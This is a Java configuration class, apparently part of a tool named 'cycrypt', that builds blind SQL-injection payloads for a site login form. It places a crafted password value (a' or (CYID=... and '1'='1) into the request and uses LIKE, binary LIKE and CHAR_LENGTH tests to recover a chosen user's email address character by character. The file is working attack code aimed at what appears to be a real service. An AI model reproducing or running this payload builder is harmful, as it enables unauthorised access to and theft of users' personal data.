package com.cycrypt.cfg;

public class EmailCryptConfig extends CryptConfig {
	private final int MAX_LEN_EMAIL=56;
	

	public EmailCryptConfig(String cyId) {
		super(cyId);
	}

	public String getContentIndexQuery(String l, int index, int contentLen) {
		return getPrefixSQL()+" and EMAIL like '"
				+ this.getContentLikeString(l, index, contentLen)
				+ "') and '1'='1";
	}

	public String getContentInstrQuery(String l) {
		return getPrefixSQL()+" and binary EMAIL like '"
				+ getContentLikeString(l) + "') and '1'='1";
	}

	public String getContentLenQuery(int len) {
		return getPrefixSQL()+" and CHAR_LENGTH(EMAIL) =" + len
				+ ") and '1'='1";
	}

	private String getPrefixSQL()
	{
		return "user_pk=cyworld@cyworld.com.cn&user_pw=a' or (CYID='"
				+ this.getCyId() + "'";
	}
	
	@Override
	public int getMaxContetLen() {
		// TODO Auto-generated method stub
		return MAX_LEN_EMAIL;
	}
}